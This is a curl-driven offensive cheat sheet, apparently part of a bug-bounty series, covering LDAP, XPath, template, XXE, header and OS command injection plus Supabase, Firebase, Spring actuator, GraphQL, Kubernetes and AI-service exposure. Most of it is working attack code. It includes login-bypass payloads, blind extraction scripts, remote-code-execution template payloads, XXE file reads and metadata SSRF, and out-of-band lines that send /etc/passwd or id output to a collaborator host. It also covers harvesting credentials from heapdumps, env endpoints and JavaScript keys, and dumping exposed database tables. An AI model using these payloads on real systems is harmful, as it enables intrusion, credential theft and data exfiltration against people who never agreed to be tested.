# 15 — LDAP · XPath · SSTI · XXE · Header · Supabase · Other Injections

## All sections: curl-first, bypass-focused, hardened-system grade

---

## 1 — LDAP Injection

### 1.1 Auth Bypass (Most Common)

LDAP auth typically constructs: `(&(uid=$USER)(userPassword=$PASS))`

```bash
T="target.com"

# Basic bypass payloads — test each independently in username + password fields
# Null/wildcard in username → match any user, anything in password matches
curl -s "https://$T/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"*","password":"*"}'

# Operator injection: close the current attribute, add OR condition
curl -s "https://$T/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin)(&(uid=*)","password":"wrongpass"}'
# Constructs: (&(uid=admin)(&(uid=*)(userPassword=wrongpass)) → admin matches

# Universal bypass — always true
curl -s "https://$T/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"*)(uid=*))(|(uid=*","password":"x"}'
# Constructs: (&(uid=*)(uid=*))(|(uid=*)(userPassword=x)) → true

# Form-encoded variant (some frameworks)
curl -s "https://$T/login" -X POST \
  -d "username=*)(uid=*))(|(uid=*&password=anything"

# Admin-targeted bypass
curl -s "https://$T/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin)(|(password=*)","password":"x"}'
```

### 1.2 Blind LDAP Injection (Attribute Enumeration)

```bash
# If filter uses: (&(uid=$USER)(attr=value))
# Inject attribute existence checks via *

# Test: does user "admin" have an email attribute?
curl -s "https://$T/search?q=admin)(mail=*" | wc -c  # TRUE response
curl -s "https://$T/search?q=admin)(mail=x@x" | wc -c  # FALSE response
# Compare sizes — different = blind injection confirmed

# Extract first char of admin's email
for char in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  size=$(curl -s "https://$T/search?q=admin)(mail=${char}*" | wc -c)
  echo "$size $char"
done | sort -rn | head -1

# Full attribute extraction via python3 curl-equivalent
python3 - <<'PYEOF'
import subprocess, string

TARGET = "https://target.com/search"
CHARSET = string.ascii_lowercase + string.digits + "@._-"
result = ""

for pos in range(1, 50):
    for char in CHARSET:
        cmd = ["curl","-s",TARGET,"-d",f"q=admin)(mail={'*'*pos}{char}*"]
        out = subprocess.run(cmd, capture_output=True, text=True).stdout
        if "true_indicator_string" in out:
            result += char
            print(f"[+] Position {pos}: {result}")
            break
print(f"[EMAIL] {result}")
PYEOF
```

### 1.3 LDAP Injection in JSON / XML API

```bash
# REST APIs often pass LDAP queries via JSON fields
# Distinguished Name injection
curl -s "https://$T/api/users/search" -X POST \
  -H "Content-Type: application/json" \
  -d '{"filter":"(cn=*)","base":"dc=company,dc=com"}'

# Inject into base DN
curl -s "https://$T/api/users" -X GET \
  "?base=dc=company,dc=com)(objectClass=*" 

# Bypass attribute filter: cn=user*)(objectClass=*
curl -s "https://$T/api/search?cn=admin*)(objectClass=*"
```

---

## 2 — XPath Injection

### 2.1 Auth Bypass

XPath auth typically: `//users/user[username/text()='$USER' and password/text()='$PASS']`

```bash
# Universal bypass — ' or '1'='1 closes the string and adds always-true
curl -s "https://$T/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\" or \"1\"=\"1","password":"x"}'

# URL-encoded form variant
curl -s "https://$T/login" -X POST \
  -d "username=admin'%20or%20'1'%3d'1&password=x"

# Complete bypass — short-circuit both conditions
# username: ' or 1=1 or '
curl -s "https://$T/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''or 1=1 or'\''","password":"x"}'

# Target first user (usually admin)
curl -s "https://$T/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"x\" or position()=1 or \"x\"=\"y","password":"x"}'
```

### 2.2 Blind XPath Extraction

```bash
# XPath boolean functions: string-length(), substring(), contains(), starts-with()
# True condition = different response than false

# Confirm blind injection: is there a user node?
TRUE=$(curl -s "https://$T/api/search?q=x' or count(//user)>0 or 'x'='y" | wc -c)
FALSE=$(curl -s "https://$T/api/search?q=x' or count(//user)>1000 or 'x'='y" | wc -c)
echo "TRUE=$TRUE FALSE=$FALSE"

# Extract node count
for n in $(seq 1 10); do
  size=$(curl -s "https://$T/api/search?q=x' or count(//user)=$n or 'x'='y" | wc -c)
  echo "$size users=$n"
done

# Extract first username character by character
python3 - <<'PYEOF'
import subprocess, string

TRUE_SIZE = 1234  # replace with actual true response size
TARGET = "https://target.com/api/search"
result = ""

for pos in range(1, 30):
    for char in string.ascii_lowercase + string.digits + "@._-":
        payload = f"x' or substring(//user[1]/username/text(),{pos},1)='{char}' or 'x'='y"
        out = subprocess.run(
            ["curl","-s",f"{TARGET}?q={payload}"],
            capture_output=True, text=True
        ).stdout
        if len(out) == TRUE_SIZE:
            result += char
            print(f"[+] {result}")
            break
print(f"[USERNAME] {result}")
PYEOF
```

---

## 3 — Server-Side Template Injection (SSTI)

### 3.1 Detection (Engine Identification)

```bash
# Probe payloads — different engines return different results
# {{7*7}} → 49 (Jinja2, Twig)
# ${7*7} → 49 (FreeMarker, Velocity, Thymeleaf, EL)
# <%= 7*7 %> → 49 (ERB/Ruby)
# {7*7} → 49 (Smarty)
# #set($x=7*7)${x} → 49 (Velocity)

for payload in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '{7*7}' '{{7*"7"}}'; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  response=$(curl -s "https://$T/render?template=$encoded")
  echo "[$payload] → $(echo $response | grep -oE '[0-9]{2,}')"
done

# In form fields (name, bio, subject, message):
for payload in '{{7*7}}' '${7*7}' '#{7*7}' '\${7*7}' '{{7*"7"}}'; do
  curl -s "https://$T/api/profile" -X PUT \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"bio\":\"$payload\"}" > /dev/null
  # Check the bio in profile response
  curl -s "https://$T/api/profile" -H "Authorization: Bearer $TOKEN" | grep -oE '[0-9]{2,}'
done
```

### 3.2 RCE Payloads by Engine

```bash
# Jinja2 (Python) — Flask/Django
# RCE via __class__.__mro__ chain
PAYLOAD='{{"".__class__.__mro__[1].__subclasses__()[256]("id",shell=True,stdout=-1).communicate()[0]}}'
# More reliable (Python 3):
PAYLOAD="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
PAYLOAD="{{request.application.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"

curl -s "https://$T/render" --data-urlencode "template=$PAYLOAD"

# Twig (PHP) — Symfony
PAYLOAD='{{["id"]|map("system")|join}}'
PAYLOAD='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'

# FreeMarker (Java)
PAYLOAD='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'

# Velocity (Java)  
PAYLOAD='#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end'

# Pebble (Java)
PAYLOAD='{% set cmd = "id" %}{% set bytes = ["/bin/bash","-c",cmd] %}{{Runtime.getRuntime().exec(["/bin/bash","-c",cmd]).text}}'

# ERB (Ruby on Rails)
PAYLOAD='<%= `id` %>'
PAYLOAD='<%= IO.popen("id").read %>'
```

---

## 4 — XXE (XML External Entity) Injection

### 4.1 Detection & Basic XXE

```bash
# Find XML processing: SOAP, SVG upload, XLSX/DOCX processing, RSS feeds, SAML
# Test XML injection point
curl -s "https://$T/api/upload" -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><data>test</data>'

# Basic XXE — file read
XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>'

curl -s "https://$T/api/upload" -X POST \
  -H "Content-Type: application/xml" \
  --data-raw "$XXE_PAYLOAD"

# SSRF via XXE — internal metadata
curl -s "https://$T/api/upload" -X POST \
  -H "Content-Type: application/xml" \
  --data-raw '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>'
```

### 4.2 Blind XXE (OOB via DNS/HTTP)

```bash
COLLABORATOR="YOUR.oastify.com"

# OOB via parameter entity
curl -s "https://$T/api/upload" -X POST \
  -H "Content-Type: application/xml" \
  --data-raw "<?xml version=\"1.0\"?><!DOCTYPE root [
  <!ENTITY % ext SYSTEM \"http://$COLLABORATOR/dtd\">
  %ext;]><data>&oob;</data>"

# DTD file served at http://COLLABORATOR/dtd:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % eval "<!ENTITY oob SYSTEM 'http://COLLABORATOR/?x=%file;'>">
# %eval;

# Host DTD with python -m http.server 80
mkdir /tmp/xxe_dtd && cat > /tmp/xxe_dtd/dtd <<EOF
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY oob SYSTEM 'http://$COLLABORATOR/?x=%file;'>">
%eval;
EOF
cd /tmp/xxe_dtd && python3 -m http.server 80 &
```

### 4.3 SVG / XLSX / DOCX XXE

```bash
# SVG XXE (image upload that renders SVG)
cat > /tmp/xxe.svg <<EOF
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text x="0" y="50">&xxe;</text></svg>
EOF

curl -s "https://$T/api/upload" -X POST \
  -F "file=@/tmp/xxe.svg;type=image/svg+xml"

# XLSX XXE (unzip, inject into xl/workbook.xml, repack)
mkdir /tmp/xlsx_xxe && cd /tmp/xlsx_xxe
cp /tmp/legit.xlsx test.zip && unzip -q test.zip
# Edit xl/workbook.xml — inject DOCTYPE before <workbook>
sed -i 's/<?xml version="1.0"[^?]*?>/<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:\/\/\/etc\/passwd">]>/' xl/workbook.xml
# Also inject entity reference somewhere in the XML
zip -qr /tmp/xxe.xlsx . && cd -
curl -s "https://$T/api/upload" -X POST -F "file=@/tmp/xxe.xlsx"
```

---

## 5 — HTTP Response Splitting / Header Injection

```bash
# If user input ends up in HTTP response headers without sanitization
# %0d%0a = \r\n = new header injection

# Test in redirect targets, Set-Cookie values, Location headers
for param in redirect return_url next callback url; do
  curl -sv "https://$T/redirect?$param=https://example.com%0d%0aX-Injected:%20yes" 2>&1 | \
    grep -i 'x-injected'
done

# Cache poisoning via header injection (unkeyed header injects response body)
curl -sv "https://$T/" -H "X-Forwarded-Host: evil.com%0d%0aContent-Length:%200%0d%0a%0d%0a" 2>&1

# CRLF injection in User-Agent, Referer (stored and reflected in logs/responses)
curl -s "https://$T/api/track" \
  -H "User-Agent: Mozilla%0d%0aSet-Cookie:%20session=malicious;Domain=.target.com" | head -5
```

---

## 6 — Command Injection (OS / Shell)

```bash
# Test every param that might touch the OS: filename, host, url, ip, domain, cmd, exec
# Inline execution: ; id, && id, | id, `id`, $(id), %0aid, %0a%0aid

for sep in '; ' '&& ' '| ' '\`' '$(' '%0a' '%26%26' '%7c'; do
  payload="${sep}id"
  response=$(curl -s "https://$T/api/ping?host=127.0.0.1${payload}")
  if echo "$response" | grep -qE 'uid=[0-9]+'; then
    echo "[CMD INJECTION] separator=$sep"
    echo "$response" | grep -oE 'uid=[0-9]+[^ ]*'
  fi
done

# Blind command injection via OOB DNS/HTTP
COLLAB="YOUR.oastify.com"
curl -s "https://$T/api/ping?host=127.0.0.1; curl http://$COLLAB/\$(id|base64)"
curl -s "https://$T/api/nslookup?domain=127.0.0.1\`curl http://$COLLAB/\$(whoami)\`"

# File upload filename injection
curl -s "https://$T/api/upload" -X POST \
  -F "file=@/tmp/test.txt;filename=test\$(id).txt"

# Command injection in HTTP headers (User-Agent, X-Forwarded-For logged and executed)
curl -s "https://$T/api/log" \
  -H "User-Agent: () { :; }; curl http://$COLLAB/shellshock"  # Shellshock
```

---

## 7 — Supabase Unauth & Misconfig Exploitation

Supabase = PostgreSQL + REST API (PostgREST) + Auth + Storage + Edge Functions.
Every Supabase project has a **public anon key** baked into JS — this key grants access
to any table where Row Level Security (RLS) is disabled or misconfigured.

### 7.1 Harvest Supabase Credentials from JS

```bash
# Pattern: supabase.createClient(URL, ANON_KEY)
grep -rh 'supabase\|createClient\|supabaseUrl\|supabaseKey' beautified/ recovered/ js_files/ | \
  grep -oE 'https://[a-z0-9]{20}\.supabase\.co|eyJ[a-zA-Z0-9_.-]{50,}' | sort -u

# Extract URL and anon key
SUPABASE_URL=$(grep -rh 'supabase' js_files/ | grep -oE 'https://[a-z0-9]{20}\.supabase\.co' | head -1)
ANON_KEY=$(grep -rh 'anon\|service_role\|eyJ' js_files/ | grep -oE 'eyJ[a-zA-Z0-9_.-]{100,}' | head -1)

echo "URL: $SUPABASE_URL"
echo "Key: $ANON_KEY"

# Decode the JWT to see what role this key grants
python3 -c "
import base64, json
key = '$ANON_KEY'
payload = key.split('.')[1]
pad = 4 - len(payload)%4
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload + '='*pad)), indent=2))
"
# "role": "anon"  = anonymous (restricted but can read tables without RLS)
# "role": "service_role"  = FULL ACCESS to all tables (P1 immediately)
```

### 7.2 PostgREST API — Dump Tables Without Auth

```bash
# Every Supabase project exposes PostgREST at /rest/v1/
# Test which tables are accessible with the anon key

# List all accessible tables (via OpenAPI spec)
curl -s "$SUPABASE_URL/rest/v1/" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ANON_KEY" | python3 -m json.tool | grep '"paths"' -A 200 | \
  grep -oE '"/[a-z][a-z_0-9]+"' | sort -u

# Read each table (first 10 records = PoC, never exfil more)
for table in users profiles accounts orders payments; do
  result=$(curl -s "$SUPABASE_URL/rest/v1/$table?limit=1" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ANON_KEY" \
    -H "Range: 0-0")  # request only 1 record
  count=$(curl -s "$SUPABASE_URL/rest/v1/$table?limit=1" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ANON_KEY" \
    -H "Prefer: count=exact" \
    -I | grep -i 'content-range' | grep -oE '[0-9]+$')
  if echo "$result" | grep -q '\[{'; then
    echo "[READABLE] $table — $count records"
    echo "$result" | python3 -m json.tool | head -20
  fi
done

# Read ALL tables via introspection
curl -s "$SUPABASE_URL/rest/v1/?apikey=$ANON_KEY" | \
  python3 -c "
import json, sys
spec = json.load(sys.stdin)
tables = list(spec.get('definitions', {}).keys())
print(f'Tables: {tables}')
"
```

### 7.3 Supabase Storage Bucket Misconfig

```bash
# Check public storage buckets
curl -s "$SUPABASE_URL/storage/v1/bucket" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ANON_KEY" | python3 -m json.tool

# For each bucket, list files
for bucket in avatars uploads documents public; do
  curl -s "$SUPABASE_URL/storage/v1/object/list/$bucket" \
    -X POST -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
    -H "Content-Type: application/json" \
    -d '{"limit":10}' | python3 -m json.tool 2>/dev/null | grep '"name"' | head -10
done

# Download a file from public bucket
curl -s "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$FILENAME" \
  -H "apikey: $ANON_KEY" -o /tmp/downloaded_file
```

### 7.4 Supabase Auth Bypass

```bash
# Email-based auth without verification requirement
curl -s "$SUPABASE_URL/auth/v1/signup" -X POST \
  -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"Test123456!"}'
# If "confirm_email_sent": false → no email verification → access as admin email

# Supabase magic link bypass: request magic link for victim email
curl -s "$SUPABASE_URL/auth/v1/magiclink" -X POST \
  -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# Phone OTP (if phone auth enabled) — enumerate + brute force
curl -s "$SUPABASE_URL/auth/v1/otp" -X POST \
  -H "apikey: $ANON_KEY" -H "Content-Type: application/json" \
  -d '{"phone":"+1234567890"}'
```

### 7.5 RLS Bypass via Supabase Edge Functions

```bash
# Edge Functions run as service_role (full DB access) if not careful
curl -s "$SUPABASE_URL/functions/v1/get-user-data" \
  -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"user_id":"any_user_uuid_here"}'
# If function doesn't validate caller identity → BOLA
```

---

## 8 — Firebase Unauth (Real-Time Database + Firestore)

```bash
# Firebase config is always in JS (apiKey is not secret — it's a project identifier)
grep -rh 'firebaseConfig\|firebaseio\|firebase' js_files/ | \
  grep -oE '"[a-zA-Z0-9-_]{8,}\.firebaseio\.com"|"[a-zA-Z0-9_-]{8,}"' | sort -u

FIREBASE_APP="your-app"
FIREBASE_KEY="AIzaSy..."

# Realtime Database — public read test
curl -s "https://$FIREBASE_APP.firebaseio.com/.json?auth=$FIREBASE_KEY"
curl -s "https://$FIREBASE_APP.firebaseio.com/users.json"
curl -s "https://$FIREBASE_APP.firebaseio.com/.json?shallow=true"  # metadata count only (use this for PoC)

# Firestore REST API
PROJ="your-gcp-project"
curl -s "https://firestore.googleapis.com/v1/projects/$PROJ/databases/(default)/documents/users?pageSize=1" \
  -H "Authorization: Bearer $FIREBASE_KEY"

# Firebase Storage (bucket read/write test)
curl -s "https://firebasestorage.googleapis.com/v0/b/$FIREBASE_APP.appspot.com/o" \
  -H "Authorization: Bearer $FIREBASE_KEY"

# Write test (confirm misconfiguration — create a .poc marker, then delete immediately)
curl -s "https://$FIREBASE_APP.firebaseio.com/POC_HUNTERTEST.json" -X PUT \
  -d '"HUNTER_WRITETEST_PROOF"'
# Delete immediately:
curl -s "https://$FIREBASE_APP.firebaseio.com/POC_HUNTERTEST.json" -X DELETE
```

---

## 9 — More Unauth Attack Surfaces (Directly Exploitable)

### 9.1 Exposed Admin Panels

```bash
# Technology-specific admin URLs
for path in \
  /admin /admin/ /admin.php /admin.html /admin-panel \
  /wp-admin /wp-login.php \
  /django-admin /grappelli/ \
  /rails/info/properties /_rails/info \
  /laravel /horizon /telescope /pulse /ignition \
  /phpmyadmin /pma /mysql /adminer \
  /jenkins /ci /hudson \
  /grafana /kibana /elastic \
  /swagger-ui /api-docs /redoc \
  /flower /celery /beat \
  /solr /solr/admin \
  /actuator /actuator/env /actuator/heapdump /actuator/beans \
  /.git/HEAD /.env /.DS_Store \
; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$T$path")
  [ "$code" != "404" ] && [ "$code" != "400" ] && echo "[$code] $path"
done
```

### 9.2 Spring Boot Actuator Full Exploitation

```bash
# Actuator endpoints: no auth = game over
for ep in env heapdump beans configprops mappings sessions scheduledtasks \
           loggers metrics info health threaddump dump; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$T/actuator/$ep")
  [ "$code" = "200" ] && {
    echo "[ACTUATOR] /actuator/$ep = 200"
    curl -s "https://$T/actuator/$ep" | python3 -m json.tool | head -30
  }
done

# Heapdump → extract credentials (needs JVM)
curl -sL "https://$T/actuator/heapdump" -o heapdump.hprof
strings heapdump.hprof | grep -iE 'password|secret|key|token|jdbc|redis' | head -30

# Env endpoint → plaintext secrets if encryption not set up
curl -s "https://$T/actuator/env" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
for ps in data.get('propertySources', []):
    for k, v in ps.get('properties', {}).items():
        if any(x in k.lower() for x in ['password','secret','key','token','credential']):
            print(f'{k}: {v.get(\"value\",v)}')
"
```

### 9.3 GraphQL Unauth Data Dump

```bash
# Introspection → find all queries/mutations → test each without auth
curl -s "https://$T/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name,fields{name,type{name,kind},description,args{name}}}}}"}' | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
fields = data.get('data',{}).get('__schema',{}).get('queryType',{}).get('fields',[])
for f in fields:
    print(f['name'], '->', f.get('type',{}).get('name',''))
"

# Test each query without auth (looking for unprotected data)
for query in users profiles orders accounts payments transactions; do
  curl -s "https://$T/graphql" -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{$query{id email username}}\"}" | \
    python3 -m json.tool | head -20
done

# Batch query abuse: send 100 variations in one request
curl -s "https://$T/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d "[$(for i in $(seq 1 100); do echo "{\"query\":\"{user(id:$i){email username}}\"}"; done | paste -sd,)]" | \
  python3 -c "
import json, sys
results = json.load(sys.stdin)
if isinstance(results, list):
    for r in results:
        if r.get('data',{}).get('user'): print(r['data']['user'])
"
```

### 9.4 Exposed Kubernetes API / Metrics

```bash
# kubectl proxy / k8s API server exposed without auth
for port in 6443 8080 8001 10250 10255 2379; do
  curl -sk "https://$T:$port/api/v1/namespaces" | head -5
done

# K8s metrics server (no auth by default in some configs)
curl -sk "https://$T:10255/stats/summary"     # kubelet read-only
curl -sk "https://$T:4194/api/v1.3/containers" # cadvisor

# etcd (if exposed — full cluster data)
curl -s "https://$T:2379/v2/keys/?recursive=true" 2>/dev/null | \
  python3 -m json.tool | grep -i 'password\|secret\|token' | head -20

# Prometheus (metrics include internal service info)
curl -s "https://$T/metrics" | grep -E '^[a-z]' | head -30
curl -s "https://$T:9090/api/v1/label/__name__/values" | python3 -m json.tool | head -20
```

### 9.5 AI/ML Unauth RCE Surfaces

```bash
# Langflow (visual AI workflow builder) — RCE via /api/v1/process endpoint
curl -s "https://$T/api/v1/chat/flow_id" -X POST \
  -H "Content-Type: application/json" \
  -d '{"inputs":{"input":"test"},"tweaks":{}}'

# Ollama (local LLM API — often exposed on internal/public IPs)
curl -s "https://$T:11434/api/tags"         # list models (no auth)
curl -s "https://$T:11434/api/generate" -X POST \
  -d '{"model":"llama2","prompt":"ls /","stream":false}'

# ComfyUI (image gen UI — no auth by default)
curl -s "https://$T:8188/system_stats"
curl -s "https://$T:8188/object_info"

# Ray Dashboard (distributed ML — no auth)
curl -s "https://$T:8265/api/jobs/"
curl -s "https://$T:8265/api/nodes"

# MLflow tracking server (experiment data + artifact paths with credentials)
curl -s "https://$T:5000/api/2.0/mlflow/experiments/list"
curl -s "https://$T:5000/api/2.0/mlflow/artifacts/list?run_id=XXX"

# Jupyter Notebook (no token = RCE)
curl -s "https://$T:8888/api/kernels" | head -5
curl -s "https://$T:8888/api/contents" | head -5
```

---

## Decision Table

| Injection Type | Confirm Signal | PoC |
|---|---|---|
| LDAP auth bypass | Login succeeds with `*)(uid=*)` payload | Login as admin without password |
| XPath auth bypass | Login succeeds with `' or '1'='1` | Login without credentials |
| SSTI | `{{7*7}}` → `49` in response | RCE via engine-specific payload |
| XXE | File content in response or OOB DNS hit | `/etc/passwd` or AWS metadata |
| Command injection | `id` output in response or OOB HTTP | `id`, `whoami`, metadata retrieval |
| Supabase service_role key | JWT role=service_role | Read/write all tables directly |
| Supabase RLS disabled | anon key reads users table | Count + redacted sample |
| Firebase unauth read | `.json` endpoint returns data | `?shallow=true` count + 1 record |
| Actuator heapdump | 200 → download HPROF file | Extract credentials from heap |
| GraphQL unauth | Query returns data without auth token | One redacted user record |
| K8s API unauth | `/api/v1/namespaces` returns 200 | List namespaces/secrets |
